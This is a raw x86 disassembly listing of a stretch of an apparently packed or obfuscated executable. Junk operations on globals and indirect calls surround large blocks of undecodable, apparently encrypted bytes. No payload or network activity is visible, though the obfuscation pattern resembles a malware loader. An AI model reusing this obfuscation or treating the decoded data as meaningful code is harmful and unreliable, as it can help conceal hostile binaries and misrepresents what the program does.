  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fd61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e19c,0x42e76f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e78b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fd51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fd51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fd51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fd51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e267
  40e8ca:	call   DWORD PTR ds:0x42e4ff
  40e8d0:	cmp    DWORD PTR ds:0x42fd51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fd51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe0a
  40e8f8:	adc    DWORD PTR ds:0x42e77f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e777,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e77b,0x42e76f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e78b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	adc    dh,bh
  40e94b:	jmp    0x40e962
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e992
  40e956:	fwait
  40e957:	and    esp,DWORD PTR [esi-0x34382703]
  40e95d:	mov    ch,BYTE PTR [edi+eax*2]
  40e960:	mov    ecx,0x1ad25556
  40e965:	dec    ecx
  40e966:	xor    bl,dh
  40e968:	xor    BYTE PTR [ecx-0x68d86cb6],cl
  40e96e:	out    dx,eax
  40e96f:	xor    al,dl
  40e971:	adc    ah,bh
  40e973:	test   cl,al
  40e975:	imul   ebx,ebx,0xffffffe3
  40e978:	mov    eax,0x6a308663
  40e97d:	ja     0x40e95b
  40e97f:	dec    edx
  40e980:	mov    ch,0x41
  40e982:	cmp    dl,BYTE PTR [esi-0x12]
  40e985:	mov    dh,0x88
  40e987:	int3   
  40e988:	out    0x23,eax
  40e98a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e98b:	(bad)  
  40e98c:	leave  
  40e98d:	out    dx,al
  40e98e:	retf   0x1850
  40e991:	call   0x60e5:0xf2d430e8
  40e998:	mov    dh,BYTE PTR [eax+0x71f0fe84]
  40e99e:	dec    edx
  40e99f:	cld    
  40e9a0:	pop    ecx
  40e9a1:	jge    0x40e948
  40e9a3:	hlt    
  40e9a4:	idiv   DWORD PTR [ebx]
  40e9a6:	sbb    al,0x4c
  40e9a8:	sti    
  40e9a9:	xor    edi,ecx
  40e9ab:	sub    BYTE PTR [edi-0x76],al
  40e9ae:	push   edx
  40e9af:	sub    ch,cl
  40e9b1:	cmp    DWORD PTR [esi],esp
  40e9b3:	xor    DWORD PTR [ebp-0x4f],0x857afa92
  40e9ba:	imul   edi,DWORD PTR [esi],0x9c92ec49
  40e9c0:	mov    bh,0xe6
  40e9c2:	test   al,0xd8
  40e9c4:	sub    ch,bh
  40e9c6:	cli    
  40e9c7:	sub    DWORD PTR [esp+ecx*2],edx
  40e9ca:	sahf   
  40e9cb:	jae    0x40ea3f
  40e9cd:	mov    ebp,0xf1cd1f3
  40e9d2:	cmp    ch,0x89
  40e9d5:	out    0x51,al
  40e9d7:	lods   al,BYTE PTR ds:[esi]
  40e9d8:	inc    esi
  40e9d9:	ret    
  40e9da:	cmc    
  40e9db:	neg    DWORD PTR [ecx]
  40e9dd:	int    0x56
  40e9df:	cld    
  40e9e0:	adc    esi,DWORD PTR [edi]
  40e9e2:	xchg   dx,ax
  40e9e4:	adc    ecx,DWORD PTR [edx+0x6584d131]
  40e9ea:	out    dx,eax
  40e9eb:	cmp    BYTE PTR [eax],bl
  40e9ed:	mov    esp,0xc32c1c3c
  40e9f2:	adc    dl,BYTE PTR [ecx+0x30ddf704]
  40e9f8:	sub    bh,BYTE PTR [edi-0x433f6901]
  40e9fe:	sti    
  40e9ff:	or     BYTE PTR [ebx+ebp*4+0x1e0efe3c],ch
  40ea06:	or     ch,BYTE PTR [edx]
  40ea08:	pushf  
  40ea09:	jl     0x40ea02
  40ea0b:	sbb    eax,0x96ec1efd
  40ea10:	inc    edi
  40ea11:	fstp   DWORD PTR [ecx+0x5b52bb99]
  40ea17:	jg     0x40e9cb
  40ea19:	nop
  40ea1a:	aam    0x5b
  40ea1c:	mov    dh,0x9e
  40ea1e:	xchg   esi,eax
  40ea1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea20:	mov    ds:0x6355e32,al
  40ea25:	lods   eax,DWORD PTR ds:[esi]
  40ea27:	xor    ebx,ebp
  40ea29:	push   es
  40ea2a:	jno    0x40ea0e
  40ea2c:	sbb    esi,DWORD PTR [ebp-0x18]
  40ea2f:	sub    ecx,DWORD PTR [ebx+ecx*8]
  40ea32:	stc    
  40ea33:	jo     0x40ea28
  40ea35:	es dec edi
  40ea37:	or     DWORD PTR [edx],0xffffff8e
  40ea3a:	pushf  
  40ea3b:	hlt    
  40ea3c:	jo     0x40ea47
  40ea3e:	inc    edi
  40ea3f:	xor    BYTE PTR [ebx+0x71],dh
  40ea42:	sti    
  40ea43:	sar    BYTE PTR [esi+0x1ef22e08],cl
  40ea49:	inc    edx
  40ea4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea4b:	rcl    DWORD PTR [ebp-0x11ffe911],0xce
  40ea52:	adc    BYTE PTR [ecx-0x21],al
  40ea55:	es (bad) 
  40ea58:	cmp    BYTE PTR [eax+0x1a1bc3a5],al
  40ea5e:	fcom   QWORD PTR [edi]
  40ea60:	mov    ebp,0x3d7863e5
  40ea65:	nop
  40ea66:	sahf   
  40ea67:	mov    esp,0x43607076
  40ea6c:	dec    edx
  40ea6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea6e:	pop    eax
  40ea6f:	aas    
  40ea70:	(bad)  
  40ea71:	sbb    eax,0x9de48795
  40ea76:	push   edi
  40ea77:	xor    edi,0xdf1e71aa
  40ea7d:	dec    esi
  40ea7e:	psubw  mm4,QWORD PTR [edx]
  40ea81:	repnz cmp ch,BYTE PTR [eax+0x7e]
  40ea85:	out    0x33,al
  40ea87:	mov    ch,0x49
  40ea89:	dec    eax
  40ea8a:	das    
  40ea8b:	sbb    edx,DWORD PTR [edi]
  40ea8d:	sub    DWORD PTR [esi],esp
  40ea8f:	shr    BYTE PTR [ecx-0x13],1
  40ea92:	icebp  
  40ea93:	xchg   esp,eax
  40ea94:	inc    ebx
  40ea95:	push   ss
  40ea96:	loop   0x40eb06
  40ea98:	mov    ecx,0xd42d2704
  40ea9d:	je     0x40ea9f
  40ea9f:	mov    cl,0xdd
  40eaa1:	test   al,0xf
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	gs std 
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e1a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e1a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e1a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e1b0
  40eafd:	push   0x42e1ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e38f
  40eb15:	cmp    DWORD PTR ds:0x42e1a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e1a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e1a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xeb
  40eb8d:	or     ebp,DWORD PTR cs:[edx-0x9]
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb25
  40eb99:	sbb    al,BYTE PTR [edx]
  40eb9b:	mov    ds:0x42534b34,al
  40eba0:	nop
  40eba1:	pop    ds
  40eba2:	ins    BYTE PTR es:[edi],dx
  40eba3:	in     al,dx
  40eba4:	jb     0x40ebd1
  40eba6:	imul   edx,DWORD PTR [ebp-0x3066cffc],0x56908f8a
  40ebb0:	shl    BYTE PTR [ebx-0x39],cl
  40ebb3:	test   al,0xa
  40ebb5:	arpl   WORD PTR [ecx-0x1c2c448d],sp
  40ebbb:	in     eax,dx
  40ebbc:	push   0xffffff9c
  40ebbe:	xor    DWORD PTR [eax-0x53d87db2],ebx
  40ebc4:	bound  eax,QWORD PTR ds:0xad0f9bc0
  40ebca:	mov    si,0x6bdd
  40ebce:	or     esi,0x77
  40ebd1:	repz cs loopne 0x40ebf8
  40ebd5:	enter  0x5c1e,0x2e
  40ebd9:	or     eax,0xa5342eea
  40ebde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebdf:	mov    ecx,ebp
  40ebe1:	adc    DWORD PTR [esi+0x287cbddc],ebp
  40ebe7:	dec    edx
  40ebe8:	(bad)  
  40ebe9:	out    0x4a,al
  40ebeb:	jnp    0x40ebe6
  40ebed:	jae    0x40ec5c
  40ebef:	dec    DWORD PTR [esi+eax*4-0x37]
  40ebf3:	scas   eax,DWORD PTR es:[edi]
  40ebf4:	cmp    DWORD PTR [ecx-0x2fc1f241],0xf4d60624
  40ebfe:	cli    
  40ebff:	mov    BYTE PTR [edx],ch
  40ec01:	cli    
  40ec02:	inc    esp
  40ec03:	mov    dh,BYTE PTR [edx+eiz*4+0x18]
  40ec07:	and    cl,BYTE PTR [esp+edx*4+0x40c1240b]
  40ec0e:	push   esi
  40ec0f:	lahf   
  40ec10:	int    0x45
  40ec12:	push   edx
  40ec13:	add    BYTE PTR [ecx],0xd
  40ec16:	loop   0x40ebe5
  40ec18:	(bad)  
  40ec1b:	cld    
  40ec1c:	iret   
  40ec1d:	sbb    eax,0x268448ba
  40ec22:	jb     0x40ebff
  40ec24:	out    0xaf,al
  40ec26:	popa   
  40ec27:	cs test al,0xc0
  40ec2a:	(bad)  
  40ec2b:	xor    al,0xee
  40ec2d:	lods   eax,DWORD PTR ds:[esi]
  40ec2e:	inc    ebx
  40ec2f:	adc    ebx,eax
  40ec31:	das    
  40ec32:	mov    WORD PTR [edx],ds
  40ec34:	sub    DWORD PTR [ebp+0x5c65f789],esi
  40ec3a:	(bad)  
  40ec3b:	or     eax,0xafd647
  40ec40:	sub    DWORD PTR [ecx-0x40],ecx
  40ec43:	xchg   esi,eax
  40ec44:	repnz imul ebp,DWORD PTR [ecx+0x10],0x7
  40ec49:	mov    cs,WORD PTR [ecx]
  40ec4b:	jno    0x40ec32
  40ec4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4e:	lods   eax,DWORD PTR ds:[esi]
  40ec4f:	stc    
  40ec50:	or     al,BYTE PTR ds:0xba938d82
  40ec56:	mov    esi,0xd329544c
  40ec5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec5c:	jle    0x40ec25
  40ec5e:	out    dx,eax
  40ec5f:	xlat   BYTE PTR ds:[ebx]
  40ec60:	jo     0x40ec6e
  40ec62:	xor    eax,0x17bd9082
  40ec67:	test   DWORD PTR [ebx-0x540e075e],eax
  40ec6d:	outs   dx,BYTE PTR ds:[esi]
  40ec6e:	stos   DWORD PTR es:[edi],eax
  40ec6f:	pop    ds
  40ec70:	add    DWORD PTR [esi+0x7bbd6dd0],esp
  40ec76:	shr    DWORD PTR [ebx-0x4e9cab34],cl
  40ec7c:	adc    eax,0xac7b1131
  40ec81:	or     al,0xd5
  40ec83:	pop    edx
  40ec84:	out    0xbb,eax
  40ec86:	iretw  
  40ec88:	and    BYTE PTR [ebx+0x4b31d93b],al
  40ec8e:	icebp  
  40ec8f:	pusha  
  40ec90:	mov    ebp,DWORD PTR [edi+0x59f9a041]
  40ec96:	and    BYTE PTR [ecx],bh
  40ec98:	jge    0x40eceb
  40ec9a:	dec    ebx
  40ec9b:	loopne 0x40ed0c
  40ec9d:	int    0x9
  40ec9f:	xchg   ebx,eax
  40eca0:	sub    al,0x1a
  40eca2:	sbb    dl,BYTE PTR [ebx-0x73a2d414]
  40eca8:	inc    edx
  40eca9:	sti    
  40ecaa:	in     eax,dx
  40ecab:	ficom  WORD PTR [ecx+eiz*8]
  40ecae:	(bad)  
  40ecaf:	xchg   ecx,eax
  40ecb0:	mov    BYTE PTR [ecx+0x43],0x48
  40ecb4:	fadd   st,st(6)
  40ecb6:	jbe    0x40ed2b
  40ecb8:	xchg   DWORD PTR [ecx-0x1f],ecx
  40ecbb:	out    dx,al
  40ecbc:	mov    al,ds:0xe6fd8ef
  40ecc1:	pop    edi
  40ecc2:	mov    dl,0x76
  40ecc4:	jbe    0x40ec47
  40ecc6:	push   esi
  40ecc7:	mov    eax,0x4ecbb5fc
  40eccc:	sbb    ah,BYTE PTR [edx+ecx*4-0x63b26c92]
  40ecd3:	(bad)  
  40ecd5:	ins    DWORD PTR es:[edi],dx
  40ecd6:	push   0x69aebdd6
  40ecdb:	sbb    ebp,DWORD PTR [ebx-0x3d0871f8]
  40ece1:	and    eax,0x3b876816
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed1a
  40ed00:	call   0xaefb57cf
  40ed05:	jo     0x40ed77
  40ed07:	ret    
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed48
  40ed0c:	enter  0x9e8a,0xd6
  40ed10:	cmp    DWORD PTR [esi+eiz*2],edx
  40ed13:	shl    BYTE PTR [edi+0x6d],1
  40ed16:	(bad)  
  40ed17:	push   edx
  40ed18:	pop    eax
  40ed19:	sbb    eax,0x6502792c
  40ed1e:	or     BYTE PTR [edx+ebx*1+0x41121290],bh
  40ed25:	(bad)  
  40ed26:	jp     0x40ed6d
  40ed28:	inc    DWORD PTR [eax]
  40ed2a:	dec    ebx
  40ed2b:	sbb    DWORD PTR [eax-0x41],ebp
  40ed2e:	cli    
  40ed2f:	or     DWORD PTR [eax],ebx
  40ed31:	and    al,0x6e
  40ed33:	shr    BYTE PTR [esi],cl
  40ed35:	dec    edi
  40ed36:	rcr    BYTE PTR [edi+0x20],0xb7
  40ed3a:	push   ss
  40ed3b:	mov    al,0xc1
  40ed3d:	(bad)  
  40ed3e:	cli    
  40ed3f:	xchg   ecx,eax
  40ed40:	test   ebp,ebp
  40ed42:	inc    DWORD PTR [eax-0x10]
  40ed45:	frstor [eax]
  40ed47:	add    BYTE PTR [ebp+0x2a],cl
  40ed4a:	add    al,0xd6
  40ed4c:	push   ds
  40ed4d:	and    BYTE PTR [ebx-0x2b2626ca],0x4b
  40ed54:	cmp    al,0xa
  40ed56:	xor    BYTE PTR [edx],0x59
  40ed59:	adc    eax,0x5c348c48
  40ed5e:	frstor [edi]
  40ed60:	mov    al,ds:0x85902a67
  40ed65:	(bad)
  40ed68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed69:	and    esp,ecx
  40ed6b:	adc    al,0x15
  40ed6d:	xor    DWORD PTR ds:0xce1ae344,edi
  40ed73:	clc    
  40ed74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed75:	pushf  
  40ed76:	out    0xbd,eax
  40ed78:	pop    ebp
  40ed79:	sub    esp,esp
  40ed7b:	cs pop eax
  40ed7d:	xchg   ebx,eax
  40ed7e:	sub    ecx,DWORD PTR [edi]
  40ed80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed81:	inc    edi
  40ed82:	jle    0x40edab
  40ed84:	pop    ecx
  40ed85:	pop    edi
  40ed86:	inc    esi
  40ed87:	sub    al,BYTE PTR [esi-0x77c095dc]
  40ed8d:	gs mov ?,ebx
  40ed90:	mov    ds:0x26b28a6c,al
  40ed95:	pop    ebx
  40ed96:	sub    eax,0x8a1e6c6d
  40ed9b:	sbb    dl,dl
  40ed9d:	or     eax,0xb4de3c1e
  40eda2:	mov    BYTE PTR [edx-0x297d7320],cl
  40eda8:	fcomp  DWORD PTR [edi]
  40edaa:	push   ebp
  40edab:	jne    0x40ed48
  40edad:	inc    edi
  40edae:	repnz push ss
  40edb0:	inc    edx
  40edb1:	mov    eax,0xdb382ea2
  40edb6:	push   ds
  40edb7:	lods   al,BYTE PTR ds:[esi]
  40edb8:	cmp    edx,ebx
  40edba:	xor    al,0x99
  40edbc:	sub    eax,0x934d5d6a
  40edc1:	jns    0x40ee28
  40edc3:	xchg   BYTE PTR [ebx-0x5a21438a],dl
  40edc9:	mov    dl,0xa
  40edcb:	xor    bl,BYTE PTR [eax+0x22]
  40edce:	cs lahf 
  40edd0:	sbb    al,ch
  40edd2:	sbb    BYTE PTR [edx-0x343c6444],al
  40edd8:	add    ebx,DWORD PTR [edx+0x0]
  40eddb:	pop    ss
  40eddc:	fimul  DWORD PTR [edx]
  40edde:	ins    BYTE PTR es:[edi],dx
  40eddf:	call   0x45c7:0xc243a75
  40ede6:	adc    BYTE PTR [edx-0x37886da4],al
  40edec:	sti    
  40eded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edee:	fistp  WORD PTR [ecx]
  40edf0:	or     dl,BYTE PTR [edi+0x6e]
  40edf3:	(bad)  
  40edf4:	pop    esp
  40edf5:	jecxz  0x40edcd
  40edf7:	data16 add BYTE PTR [edi],ah
  40edfa:	inc    ecx
  40edfb:	adc    DWORD PTR [esp+esi*8+0x2a],esi
  40edff:	mov    al,0x46
  40ee01:	clc    
  40ee02:	in     al,dx
  40ee03:	fisttp DWORD PTR [edi]
  40ee05:	sbb    edx,edi
  40ee07:	int3   
  40ee08:	dec    esi
  40ee09:	adc    al,BYTE PTR ds:0xea3ecbe2
  40ee0f:	mov    eax,0x6ef6557a
  40ee14:	push   ds
  40ee15:	js     0x40ee3f
  40ee17:	sbb    ebx,DWORD PTR [ebp+0x6a]
  40ee1a:	lock mov bh,0x86
  40ee1d:	sub    eax,0xf8bf5b90
  40ee22:	imul   DWORD PTR [edi]
  40ee24:	xchg   ecx,eax
  40ee25:	loopne 0x40eea0
  40ee27:	mov    eax,0x849ffa4c
  40ee2c:	pop    ebx
  40ee2d:	sub    BYTE PTR [edi],0x13
  40ee30:	test   al,0x48
  40ee32:	sahf   
  40ee33:	popf   
  40ee34:	xor    eax,0xd72b265f
  40ee39:	xor    al,0x68
  40ee3b:	sbb    BYTE PTR [edx-0x60],bl
  40ee3e:	cmp    ch,BYTE PTR [edi-0xc963864]
  40ee44:	and    al,0x7
  40ee46:	ins    DWORD PTR es:[edi],dx
  40ee47:	(bad)  
  40ee48:	pushf  
  40ee49:	xor    dh,BYTE PTR [ebx]
  40ee4b:	or     eax,DWORD PTR [edi-0x500908a0]
  40ee51:	je     0x40ee16
  40ee53:	test   BYTE PTR cs:[edx+0x42],0x88
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xdc
  40ee7f:	add    eax,0xac0d7962
  40ee84:	jo     0x40eef6
  40ee86:	ret    
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eebf
  40ee8b:	cs push ss
  40ee8d:	ds div ebp
  40ee90:	lock push ss
  40ee92:	xchg   esp,eax
  40ee93:	cmp    DWORD PTR [ecx],edx
  40ee95:	add    DWORD PTR [eax+0x40],0xffffffef
  40ee99:	aas    
  40ee9a:	push   esp
  40ee9b:	xor    eax,0x1b38acd
  40eea0:	lods   al,BYTE PTR ds:[esi]
  40eea1:	into   
  40eea2:	cmc    
  40eea3:	cmp    al,al
  40eea5:	mov    esp,0x10a0a703
  40eeaa:	add    eax,0xe34a62e1
  40eeaf:	or     bh,BYTE PTR [ebx]
  40eeb1:	xchg   ebx,eax
  40eeb2:	add    al,0xca
  40eeb4:	pop    ebx
  40eeb5:	shl    DWORD PTR [edx-0x7d],0x34
  40eeb9:	not    DWORD PTR [esi-0x55]
  40eebc:	or     BYTE PTR [ebx+0x3954a66e],bh
  40eec2:	mov    es,ecx
  40eec4:	jle    0x40ee66
  40eec6:	int3   
  40eec7:	iret   
  40eec8:	adc    al,0xb5
  40eeca:	sbb    al,al
  40eecc:	jne    0x40eeb3
  40eece:	fdiv   st,st(1)
  40eed0:	outs   dx,BYTE PTR ds:[esi]
  40eed1:	cmp    ebp,ebx
  40eed3:	rcl    DWORD PTR [edx],0xa8
  40eed6:	sub    DWORD PTR [eax+0x20],edx
  40eed9:	sti    
  40eeda:	dec    esi
  40eedb:	jge    0x40ee8e
  40eedd:	mov    ah,0xa0
  40eedf:	fisubr DWORD PTR [edx-0x29e4dc9c]
  40eee5:	fist   WORD PTR [ebx+0x75374fee]
  40eeeb:	cmp    eax,0xa404de7b
  40eef0:	adc    eax,0x4ea970db
  40eef5:	pop    ebp
  40eef6:	popf   
  40eef7:	pop    ds
  40eef8:	stos   BYTE PTR es:[edi],al
  40eef9:	fstp   st(7)
  40eefb:	pusha  
  40eefc:	cmp    BYTE PTR [edi-0x74eed904],dh
  40ef02:	or     BYTE PTR es:[esi-0x37],bl
  40ef06:	(bad)  
  40ef08:	shr    edi,cl
  40ef0a:	dec    ebx
  40ef0b:	in     eax,0x50
  40ef0d:	pop    esp
  40ef0e:	retf   
  40ef0f:	pop    edi
  40ef10:	out    0xd0,eax
  40ef12:	pop    es
  40ef13:	sbb    BYTE PTR [ebx],ah
  40ef15:	dec    edx
  40ef16:	test   eax,0xe2b34fc9
  40ef1b:	dec    ebp
  40ef1c:	cli    
  40ef1d:	xchg   ecx,eax
  40ef1e:	repnz pop ss
  40ef20:	dec    eax
  40ef21:	sub    DWORD PTR [ebp-0x7c],0xaf91f497
  40ef28:	xchg   edi,eax
  40ef29:	rcl    bh,1
  40ef2b:	dec    eax
  40ef2c:	popa   
  40ef2d:	inc    eax
  40ef2e:	push   ebp
  40ef2f:	call   0xa7497996
  40ef34:	mov    ds:0x6ede1b5a,al
  40ef39:	jne    0x40eef8
  40ef3b:	fxch   st(3)
  40ef3d:	dec    esp
  40ef3e:	xor    al,0x3d
  40ef40:	call   0x20a65c1e
  40ef45:	adc    DWORD PTR [ebx],edi
  40ef47:	mov    dh,0x5
  40ef49:	jmp    0x90d4b2a5
  40ef4e:	imul   edi,DWORD PTR [edx+0x5],0xffffff9e
  40ef52:	ds pop ebx
  40ef54:	jmp    0xcb64d91d
  40ef59:	xor    BYTE PTR [edx-0x80a5d86],0x6f
  40ef60:	mov    esi,0xa6f4415d
  40ef65:	not    edi
  40ef67:	fild   WORD PTR [edi]
  40ef6a:	inc    ebx
  40ef6b:	xchg   DWORD PTR [esi+ecx*4],eax
  40ef6e:	add    DWORD PTR ds:0xb4eaf05d,0xffffffa1
  40ef75:	loope  0x40ef8d
  40ef77:	hlt    
  40ef78:	xor    BYTE PTR [edi-0x7f5fb5c5],al
  40ef7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef7f:	jle    0x40ef6d
  40ef81:	mov    esp,0xb5f6fc24
  40ef86:	dec    ecx
  40ef87:	xor    BYTE PTR [edi+0x26823b18],cl
  40ef8d:	push   ebp
  40ef8e:	mov    ebx,0x1732ee20
  40ef93:	push   edi
  40ef94:	push   ecx
  40ef95:	out    0x96,eax
  40ef97:	in     al,0x8c
  40ef99:	and    ch,BYTE PTR [ecx+0xc]
  40ef9c:	and    edx,ecx
  40ef9e:	pop    ds
  40ef9f:	or     BYTE PTR ds:0xd30ed43f,cl
  40efa5:	sub    bh,BYTE PTR [ebx-0x3145ead5]
  40efab:	inc    edx
  40efac:	inc    esi
  40efad:	pop    ss
  40efae:	push   ss
  40efaf:	retf   0xa1d6
  40efb2:	cmp    al,0x8
  40efb4:	loopne 0x40f000
  40efb6:	mov    al,0x66
  40efb8:	and    cl,BYTE PTR ds:0xbc81f542
  40efbe:	(bad)  
  40efc0:	dec    esp
  40efc1:	scas   al,BYTE PTR es:[edi]
  40efc2:	push   0x1d05a699
  40efc7:	sbb    dh,BYTE PTR [ebx]
  40efc9:	or     ebp,DWORD PTR [ebx]
  40efcb:	shr    DWORD PTR [edi],1
  40efcd:	adc    al,0xa0
  40efcf:	cmp    BYTE PTR [ecx+0x4a2f9bb1],dh
  40efd5:	and    BYTE PTR [edx-0x7b7239cd],0x8
  40efdc:	pushf  
  40efdd:	jb     0x40f011
  40efdf:	add    BYTE PTR [esi-0x77],ah
  40efe2:	inc    ebp
  40efe3:	cld    
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	or     bl,ah
  40effc:	or     BYTE PTR [ebp+0x7070abd0],bl
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40ef90
  40f007:	cmp    eax,0x462eaec1
  40f00c:	fbld   TBYTE PTR [eax]
  40f00e:	dec    ecx
  40f00f:	test   BYTE PTR [edx+0x222433e9],bh
  40f015:	not    DWORD PTR [esi]
  40f017:	adc    DWORD PTR [ecx-0x75],ebp
  40f01a:	cmp    ebx,DWORD PTR cs:0x40f85945
  40f021:	into   
  40f022:	fsub   st(5),st
  40f024:	or     BYTE PTR [eax],cl
  40f026:	jbe    0x40f03a
  40f028:	cmp    eax,0xa4941114
  40f02d:	inc    ebx
  40f02e:	mov    eax,ds:0xdcb903bf
  40f033:	adc    esp,0x6f229541
  40f039:	xor    al,0x80
  40f03b:	mul    DWORD PTR [edx+0x25]
  40f03e:	xor    DWORD PTR [esi],ebp
  40f040:	pop    es
  40f041:	push   0xffffffd5
  40f043:	xor    al,dl
  40f045:	hlt    
  40f046:	push   eax
  40f047:	mov    esp,0xd0d5cbfb
  40f04c:	pop    ds
  40f04d:	stc    
  40f04e:	push   ebp
  40f04f:	shr    BYTE PTR [eax+0x1b632236],1
  40f055:	sbb    esi,DWORD PTR [esi+eiz*1-0x61]
